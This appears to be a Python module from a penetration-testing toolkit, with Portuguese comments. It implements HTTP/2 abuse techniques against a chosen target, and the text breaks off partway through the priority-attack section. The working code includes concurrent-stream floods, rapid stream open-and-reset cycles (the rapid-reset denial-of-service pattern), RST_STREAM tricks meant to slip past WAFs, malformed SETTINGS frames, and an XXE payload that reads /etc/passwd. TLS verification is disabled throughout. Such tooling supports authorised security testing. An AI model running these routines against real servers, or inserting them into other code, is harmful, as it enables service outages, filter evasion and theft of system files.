#!/usr/bin/env python3
"""Modulo de testes de HTTP/2 Abuse.

Testa vulnerabilidades no protocolo HTTP/2:
  - HTTP/2 Downgrade: Mismatch HTTP/2→HTTP/1.1 para smuggling
  - HTTP/2 Fingerprint: Detectar tecnologias via padroes HTTP/2
  - HTTP/2 Stream Multiplexing Abuse: Explorar stream multiplexing
  - HTTP/2 Reset Attack: RST_STREAM para confundir WAF
  - HTTP/2 SETTINGS Abuse: Manipular SETTINGS frame
  - Prioritization Attack: Priority frames para afetar processamento
  - Server Push Abuse: Explorar Server Push

IMPORTANTE: Usa a lib h2 para manipulacao correta de frames HTTP/2.
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import socket
import ssl
import time
from collections.abc import Callable, Coroutine
from dataclasses import asdict, dataclass
from typing import Any

import h2.config
import h2.connection
import h2.errors
import h2.events
import h2.settings

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_banner,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.http2abuse")

# ─── Banner ──────────────────────────────────────────────────────────────────

_BANNER_LINES: str = (
    "  _   _   _  __     __  ___ _   _  __      __  __ _    _ __  __ ____  \n"
    " | | | | | | \\ \\   / / |_ _| \\ | | \\ \\    / / / _ \\  | |  \\/  |  _ \\ \n"
    " | |_| | | |  \\ \\ / /   | ||  \\| |  \\ \\/\\/ /  | | | | | |\\/| | |_) |\n"
    " |  _  | | |   \\ V /    | || |\\  |   \\  /\\  /| |_| | | | |  | |  _ < \n"
    " |_| |_| |_|    \\_/    |___|_| \\_|    \\/  \\/  \\___/  |_|_|  |_|_| \\_\\\n"
)

# ─── Category Map ────────────────────────────────────────────────────────────

_CATEGORY_MAP: dict[str, list[str]] = {
    "h2_downgrade": [
        "alpn_downgrade",
        "http1_on_h2",
        "connect_abuse",
        "upgrade_h2c",
    ],
    "h2_fingerprint": [
        "settings_analysis",
        "window_update_pattern",
        "preface_probe",
        "settings_softdetect",
    ],
    "h2_stream_abuse": [
        "concurrent_flood",
        "half_open_streams",
        "resource_exhaustion",
        "large_header_stream",
    ],
    "h2_reset_attack": [
        "rst_after_headers",
        "rst_data_partial",
        "rst_selective",
        "rst_timing_window",
    ],
    "h2_settings_abuse": [
        "max_header_zero",
        "max_streams_zero",
        "window_size_max",
        "header_table_extreme",
    ],
    "h2_priority_attack": [
        "exclusive_flag",
        "deep_tree",
        "circular_dep",
        "weight_extreme",
    ],
    "h2_push_abuse": [
        "settings_enable_push",
        "rst_consumption",
        "amplification",
        "path_manipulation",
    ],
}

# ─── TLS + h2 Connection ────────────────────────────────────────────────────


def _parse_url(url: str) -> tuple[str, str, int, bool]:
    """Extrai host, path, port, tls de uma URL."""
    from urllib.parse import urlparse

    parsed = urlparse(url)
    host = parsed.hostname or ""
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"
    tls = parsed.scheme == "https"
    port = parsed.port or (443 if tls else 80)
    return host, path, port, tls


def _create_tls_socket(
    host: str,
    port: int,
    timeout: float,
) -> ssl.SSLSocket:
    """Cria socket TLS com ALPN h2."""
    sock = socket.create_connection((host, port), timeout=timeout)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2", "http/1.1"])
    return ctx.wrap_socket(sock, server_hostname=host)


def _create_h2_connection(
    host: str,
    port: int,
    timeout: float,
    *,
    validate_outbound: bool = True,
    normalize_outbound: bool = True,
) -> tuple[socket.socket, h2.connection.H2Connection]:
    """Cria conexao TLS + H2Connection com preface enviado."""
    tls_sock = _create_tls_socket(host, port, timeout)
    config = h2.config.H2Configuration(
        client_side=True,
        header_encoding="utf-8",
        validate_outbound_headers=validate_outbound,
        normalize_outbound_headers=normalize_outbound,
    )
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())
    return tls_sock, conn


def _recv_events(
    sock: socket.socket,
    conn: h2.connection.H2Connection,
    timeout: float,
) -> list[h2.events.Event]:
    """Recebe dados do socket e retorna eventos h2."""
    sock.settimeout(timeout)
    try:
        data = sock.recv(65535)
    except TimeoutError, OSError:
        return []
    if not data:
        return []
    return conn.receive_data(data)


def _h2_abuse_evidence(events: list[h2.events.Event]) -> tuple[bool, int]:
    """Evidencia real de mau processamento h2 no servidor.

    Retorna (goaway, resets): True quando o servidor encerrou a conexao
    (GOAWAY/ConnectionTerminated) ou respondeu com RST_STREAM ao abuso.
    """
    goaway = False
    resets = 0
    for ev in events:
        if isinstance(ev, h2.events.ConnectionTerminated):
            goaway = True
        elif isinstance(ev, h2.events.StreamReset):
            resets += 1
    return goaway, resets


def _drain_settings(
    sock: socket.socket,
    conn: h2.connection.H2Connection,
    timeout: float,
) -> dict[str, int]:
    """Drena o handshake inicial (SETTINGS do server) e retorna settings."""
    server_settings: dict[str, int] = {}
    t0 = time.monotonic()
    while time.monotonic() - t0 < timeout:
        events = _recv_events(sock, conn, timeout)
        if not events:
            break
        for ev in events:
            if isinstance(ev, h2.events.RemoteSettingsChanged):
                for setting, changed in ev.changed_settings.items():
                    name = str(getattr(setting, "name", setting))
                    server_settings[name] = changed.new_value
            if isinstance(ev, h2.events.ConnectionTerminated):
                return server_settings
    return server_settings


def _collect_server_settings(
    sock: socket.socket,
    conn: h2.connection.H2Connection,
    timeout: float,
) -> dict[str, int]:
    """Coleta SETTINGS do servidor apos conexao h2."""
    server_settings: dict[str, int] = {}
    sock.settimeout(timeout)
    try:
        data = sock.recv(65535)
    except TimeoutError, OSError:
        return {}
    if not data:
        return {}
    events = conn.receive_data(data)
    for ev in events:
        if isinstance(ev, h2.events.RemoteSettingsChanged):
            for setting, changed in ev.changed_settings.items():
                name = str(getattr(setting, "name", setting))
                server_settings[name] = changed.new_value
    return server_settings


# ─── Dataclasses ─────────────────────────────────────────────────────────────


@dataclass(frozen=True, slots=True)
class HTTP2Attempt:
    """Tentativa individual de ataque HTTP/2."""

    technique: str
    category: str
    description: str
    h2_supported: bool
    settings_observed: dict[str, int]
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class HTTP2Result:
    """Resultado consolidado do scan HTTP/2 Abuse."""

    target: str
    host: str
    port: int
    h2_supported: bool
    server_settings: dict[str, int]
    attempts: list[HTTP2Attempt]
    vulnerable_techniques: list[str]
    issues: list[str]
    overall_status: str


# ─── Category 129: h2_downgrade ─────────────────────────────────────────────


async def _test_h2_downgrade(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa downgrade HTTP/2→HTTP/1.1 e abusos de negociacao."""
    results: list[HTTP2Attempt] = []

    # 129a: ALPN downgrade
    try:
        sock = _create_tls_socket(host, port, timeout)
        try:
            alpn = sock.selected_alpn_protocol()
            h2_ok = alpn == "h2"
            details = f"ALPN negotiated: {alpn}"
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="alpn_downgrade",
                    category="h2_downgrade",
                    description="Testa se server aceita downgrade via ALPN",
                    h2_supported=h2_ok,
                    settings_observed=server_settings,
                    vulnerable=False,
                    details=details,
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="alpn_downgrade",
                category="h2_downgrade",
                description="Testa se server aceita downgrade via ALPN",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 129b: HTTP/1.1 request em conexao h2
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("user-agent", "Mozilla/5.0 (HTTP/1.1)"),
                ],
                end_stream=True,
            )
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            status = 0
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    for k, v in ev.headers:
                        if k == ":status":
                            status = int(v)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="http1_on_h2",
                    category="h2_downgrade",
                    description="Envia HTTP/1.1 user-agent em conexao h2",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=False,
                    details=f"Status: {status}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="http1_on_h2",
                category="h2_downgrade",
                description="Envia HTTP/1.1 user-agent em conexao h2",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 129c: CONNECT method abuse
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [
                    (":method", "CONNECT"),
                    (":authority", f"{host}:{port}"),
                ],
                end_stream=False,
            )
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            status = 0
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    for k, v in ev.headers:
                        if k == ":status":
                            status = int(v)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="connect_abuse",
                    category="h2_downgrade",
                    description="CONNECT method em conexao h2",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=status in (200, 201),
                    details=f"CONNECT status: {status}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="connect_abuse",
                category="h2_downgrade",
                description="CONNECT method em conexao h2",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 129d: Upgrade h2c
    try:
        import httpx

        upgrade_url = f"http://{host}:{port}{path}"
        async with httpx.AsyncClient(verify=False) as client:
            resp = await client.get(
                upgrade_url,
                headers={"Upgrade": "h2c", "Connection": "Upgrade"},
                timeout=timeout,
            )
            upgraded = resp.status_code == 101
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="upgrade_h2c",
                    category="h2_downgrade",
                    description="Testa Upgrade: h2c em conexao HTTP/1.1",
                    h2_supported=upgraded,
                    settings_observed=server_settings,
                    vulnerable=upgraded,
                    details=f"Upgrade status: {resp.status_code}",
                    error="",
                )
            )
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="upgrade_h2c",
                category="h2_downgrade",
                description="Testa Upgrade: h2c em conexao HTTP/1.1",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    return results


# ─── Category 130: h2_fingerprint ───────────────────────────────────────────

_H2_SIGNATURES: dict[str, dict[str, int]] = {
    "nginx": {"MAX_FRAME_SIZE": 16384, "HEADER_TABLE_SIZE": 4096},
    "apache": {"MAX_FRAME_SIZE": 16384, "HEADER_TABLE_SIZE": 4096},
    "cloudflare": {"MAX_FRAME_SIZE": 16384, "HEADER_TABLE_SIZE": 1000},
    "golang": {"MAX_FRAME_SIZE": 16384, "HEADER_TABLE_SIZE": 4096},
    "node": {"MAX_FRAME_SIZE": 16384, "HEADER_TABLE_SIZE": 4096},
}


def _fingerprint_server(settings: dict[str, int]) -> str:
    """Tenta identificar servidor baseado nos SETTINGS."""
    if not settings:
        return "unknown"
    for name, sig in _H2_SIGNATURES.items():
        match = True
        for key, expected in sig.items():
            if settings.get(key) is not None and settings.get(key) != expected:
                match = False
                break
        if match:
            return name
    return "unknown"


async def _test_h2_fingerprint(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa fingerprinting de servidor via HTTP/2."""
    results: list[HTTP2Attempt] = []

    # 130a: settings_analysis
    server_id = _fingerprint_server(server_settings)
    results.append(
        HTTP2Attempt(
            technique="settings_analysis",
            category="h2_fingerprint",
            description="Analisa SETTINGS do server para fingerprint",
            h2_supported=bool(server_settings),
            settings_observed=server_settings,
            vulnerable=False,
            details=f"Server fingerprint: {server_id}",
            error="",
        )
    )

    # 130b: window_update_pattern
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            window_updates = 0
            t0 = time.monotonic()
            while time.monotonic() - t0 < 2.0:
                events = _recv_events(sock, conn, 0.5)
                for ev in events:
                    if isinstance(ev, h2.events.WindowUpdated):
                        window_updates += 1
            results.append(
                HTTP2Attempt(
                    technique="window_update_pattern",
                    category="h2_fingerprint",
                    description="Analisa padroes de WINDOW_UPDATE",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=False,
                    details=f"WINDOW_UPDATEs received: {window_updates}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="window_update_pattern",
                category="h2_fingerprint",
                description="Analisa padroes de WINDOW_UPDATE",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 130c: preface_probe
    try:
        sock = _create_tls_socket(host, port, timeout)
        try:
            custom_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            sock.sendall(custom_preface)
            # Empty SETTINGS frame: length=0, type=0x04, flags=0, stream_id=0
            empty_settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
            sock.sendall(empty_settings)
            sock.settimeout(timeout)
            data = sock.recv(65535)
            has_settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00" in data
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="preface_probe",
                    category="h2_fingerprint",
                    description="Envia preface customizado e analisa resposta",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=has_settings,
                    details=f"Response size: {len(data)} bytes, has SETTINGS: {has_settings}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="preface_probe",
                category="h2_fingerprint",
                description="Envia preface customizado e analisa resposta",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 130d: settings_softdetect
    max_streams = server_settings.get("MAX_CONCURRENT_STREAMS")
    max_frame = server_settings.get("MAX_FRAME_SIZE")
    header_table = server_settings.get("HEADER_TABLE_SIZE")
    results.append(
        HTTP2Attempt(
            technique="settings_softdetect",
            category="h2_fingerprint",
            description="Compara defaults de SETTINGS por implementacao",
            h2_supported=bool(server_settings),
            settings_observed=server_settings,
            vulnerable=False,
            details=(
                f"MAX_CONCURRENT_STREAMS={max_streams}, MAX_FRAME_SIZE={max_frame}, HEADER_TABLE_SIZE={header_table}"
            ),
            error="",
        )
    )

    return results


# ─── Category 131: h2_stream_abuse ──────────────────────────────────────────


async def _test_h2_stream_abuse(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa abusos de stream multiplexing."""
    results: list[HTTP2Attempt] = []

    # 131a: concurrent_flood
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            max_streams = server_settings.get("MAX_CONCURRENT_STREAMS", 100)
            opened = 0
            errors = 0
            for _ in range(min(max_streams + 5, 110)):
                try:
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(
                        sid,
                        [
                            (":method", "GET"),
                            (":path", path),
                            (":scheme", "https"),
                            (":authority", host),
                        ],
                        end_stream=True,
                    )
                    opened += 1
                except Exception:
                    errors += 1
                    break
            sock.sendall(conn.data_to_send())
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="concurrent_flood",
                    category="h2_stream_abuse",
                    description="Abre streams alem do limite MAX_CONCURRENT_STREAMS",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=opened > max_streams,
                    details=f"Opened {opened}/{max_streams + 5} streams, errors: {errors}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="concurrent_flood",
                category="h2_stream_abuse",
                description="Abre streams alem do limite MAX_CONCURRENT_STREAMS",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 131b: half_open_streams
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            half_open = 0
            for _ in range(10):
                try:
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(
                        sid,
                        [
                            (":method", "POST"),
                            (":path", path),
                            (":scheme", "https"),
                            (":authority", host),
                        ],
                        end_stream=False,
                    )
                    half_open += 1
                except Exception:
                    break
            sock.sendall(conn.data_to_send())
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="half_open_streams",
                    category="h2_stream_abuse",
                    description="Abre streams sem enviar DATA (half-closed local)",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=half_open > 0,
                    details=f"Half-open streams: {half_open}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="half_open_streams",
                category="h2_stream_abuse",
                description="Abre streams sem enviar DATA (half-closed local)",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 131c: resource_exhaustion (rapid open/close)
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            cycles = 0
            t0 = time.monotonic()
            while time.monotonic() - t0 < 2.0 and cycles < 50:
                try:
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(
                        sid,
                        [
                            (":method", "GET"),
                            (":path", path),
                            (":scheme", "https"),
                            (":authority", host),
                        ],
                        end_stream=True,
                    )
                    sock.sendall(conn.data_to_send())
                    conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
                    sock.sendall(conn.data_to_send())
                    cycles += 1
                except Exception:
                    break
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="resource_exhaustion",
                    category="h2_stream_abuse",
                    description="Criacao/destruicao rapida de streams",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=cycles > 20,
                    details=f"Rapid cycles: {cycles} in {time.monotonic() - t0:.1f}s",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="resource_exhaustion",
                category="h2_stream_abuse",
                description="Criacao/destruicao rapida de streams",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 131d: large_header_stream
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            large_value = "A" * 8192
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("x-large-header", large_value),
                ],
                end_stream=True,
            )
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            status = 0
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    for k, v in ev.headers:
                        if k == ":status":
                            status = int(v)
                if isinstance(ev, h2.events.StreamReset):
                    status = -1
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="large_header_stream",
                    category="h2_stream_abuse",
                    description="Envia stream com header de 8KB",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=status in (0, -1),
                    details=f"Status: {status}, header size: 8192 bytes",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="large_header_stream",
                category="h2_stream_abuse",
                description="Envia stream com header de 8KB",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    return results


# ─── Category 132: h2_reset_attack ──────────────────────────────────────────


async def _test_h2_reset_attack(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa RST_STREAM attacks para confundir WAFs."""
    results: list[HTTP2Attempt] = []

    # 132a: rst_after_headers
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "POST"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("content-type", "application/x-www-form-urlencoded"),
                    ("content-length", "13"),
                ],
                end_stream=False,
            )
            sock.sendall(conn.data_to_send())
            conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="rst_after_headers",
                    category="h2_reset_attack",
                    description="RST_STREAM imediatamente apos HEADERS",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        "RST_STREAM sent after HEADERS on stream "
                        + str(sid)
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="rst_after_headers",
                category="h2_reset_attack",
                description="RST_STREAM imediatamente apos HEADERS",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 132b: rst_data_partial
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "POST"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("content-type", "application/octet-stream"),
                    ("content-length", "1000"),
                ],
                end_stream=False,
            )
            conn.send_data(sid, b"X" * 100, end_stream=False)
            sock.sendall(conn.data_to_send())
            conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="rst_data_partial",
                    category="h2_reset_attack",
                    description="RST_STREAM apos HEADERS + DATA parcial",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        f"Partial DATA (100/1000 bytes) then RST on stream {sid}"
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="rst_data_partial",
                category="h2_reset_attack",
                description="RST_STREAM apos HEADERS + DATA parcial",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 132c: rst_selective
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            stream_ids = []
            for _ in range(5):
                sid = conn.get_next_available_stream_id()
                conn.send_headers(
                    sid,
                    [
                        (":method", "GET"),
                        (":path", path),
                        (":scheme", "https"),
                        (":authority", host),
                    ],
                    end_stream=True,
                )
                stream_ids.append(sid)
            sock.sendall(conn.data_to_send())
            for sid in stream_ids[::2]:
                conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="rst_selective",
                    category="h2_reset_attack",
                    description="RST seletivo de streams em conexao multiplexada",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        f"Reset streams {stream_ids[::2]} of {stream_ids}"
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="rst_selective",
                category="h2_reset_attack",
                description="RST seletivo de streams em conexao multiplexada",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # 132d: rst_timing_window
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "POST"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("content-type", "text/xml"),
                ],
                end_stream=False,
            )
            sock.sendall(conn.data_to_send())
            await asyncio.sleep(0.05)
            conn.send_data(
                sid,
                b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                end_stream=True,
            )
            sock.sendall(conn.data_to_send())
            await asyncio.sleep(0.05)
            conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            goaway, resets = _h2_abuse_evidence(events)
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="rst_timing_window",
                    category="h2_reset_attack",
                    description="RST com timing para explorar gap de processamento",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=goaway or resets > 0,
                    details=(
                        f"Delayed RST with XXE payload on stream {sid}"
                        + f" | evidence: goaway={goaway}, resets={resets}"
                    ),
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="rst_timing_window",
                category="h2_reset_attack",
                description="RST com timing para explorar gap de processamento",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    return results


# ─── Category 133: h2_settings_abuse ────────────────────────────────────────


async def _test_h2_settings_abuse(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa abusos de SETTINGS frame."""
    results: list[HTTP2Attempt] = []

    abuse_settings: list[tuple[str, dict[int, int], str]] = [
        (
            "max_header_zero",
            {h2.settings.SettingCodes.MAX_HEADER_LIST_SIZE: 0},
            "MAX_HEADER_LIST_SIZE=0",
        ),
        (
            "max_streams_zero",
            {h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 0},
            "MAX_CONCURRENT_STREAMS=0",
        ),
        (
            "window_size_max",
            {h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 2147483647},
            "INITIAL_WINDOW_SIZE=2^31-1",
        ),
        (
            "header_table_extreme",
            {h2.settings.SettingCodes.HEADER_TABLE_SIZE: 0},
            "HEADER_TABLE_SIZE=0",
        ),
    ]

    for technique, settings_dict, desc in abuse_settings:
        try:
            sock, conn = _create_h2_connection(
                host,
                port,
                timeout,
                validate_outbound=False,
                normalize_outbound=False,
            )
            try:
                _drain_settings(sock, conn, timeout)
                conn.update_settings(settings_dict)
                sock.sendall(conn.data_to_send())
                events = _recv_events(sock, conn, timeout)
                got_goaway = any(
                    isinstance(ev, h2.events.ConnectionTerminated) for ev in events
                )
                got_ack = any(
                    isinstance(ev, h2.events.SettingsAcknowledged) for ev in events
                )
                vulnerable = got_ack and not got_goaway
                results.append(
                    HTTP2Attempt(
                        exploit="h2_rapid_reset_command",
                        tool="h2load",
                        technique=technique,
                        category="h2_settings_abuse",
                        description=f"Enviado SETTINGS: {desc}",
                        h2_supported=True,
                        settings_observed=server_settings,
                        vulnerable=vulnerable,
                        details=f"ACK: {got_ack}, GOAWAY: {got_goaway}",
                        error="",
                    )
                )
            finally:
                sock.close()
        except Exception as e:
            results.append(
                HTTP2Attempt(
                    technique=technique,
                    category="h2_settings_abuse",
                    description=f"Enviado SETTINGS: {desc}",
                    h2_supported=False,
                    settings_observed={},
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category 134: h2_priority_attack ───────────────────────────────────────


async def _test_h2_priority_attack(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    server_settings: dict[str, int],
) -> list[HTTP2Attempt]:
    """Testa abusos de Priority frame."""
    results: list[HTTP2Attempt] = []

    # 134a: exclusive_flag
    try:
        sock, conn = _create_h2_connection(host, port, timeout)
        try:
            _drain_settings(sock, conn, timeout)
            sid = conn.get_next_available_stream_id()
            conn.send_headers(
                sid,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                ],
                end_stream=True,
                priority_weight=256,
                priority_depends_on=0,
                priority_exclusive=True,
            )
            sock.sendall(conn.data_to_send())
            events = _recv_events(sock, conn, timeout)
            got_response = any(
                isinstance(ev, h2.events.ResponseReceived) for ev in events
            )
            results.append(
                HTTP2Attempt(
                    exploit="h2_rapid_reset_command",
                    tool="h2load",
                    technique="exclusive_flag",
                    category="h2_priority_attack",
                    description="PRIORITY com exclusive=True para monopolizar bandwidth",
                    h2_supported=True,
                    settings_observed=server_settings,
                    vulnerable=got_response,
                    details=f"Exclusive priority on stream {sid}, response: {got_response}",
                    error="",
                )
            )
        finally:
            sock.close()
    except Exception as e:
        results.append(
            HTTP2Attempt(
                technique="exclusive_flag",
                category="h2_priority_attack",
                description="PRIORITY com exclusive=True para monopolizar bandwidth",
                h2_supported=False,
                settings_observed={},
                vulnerable=False,
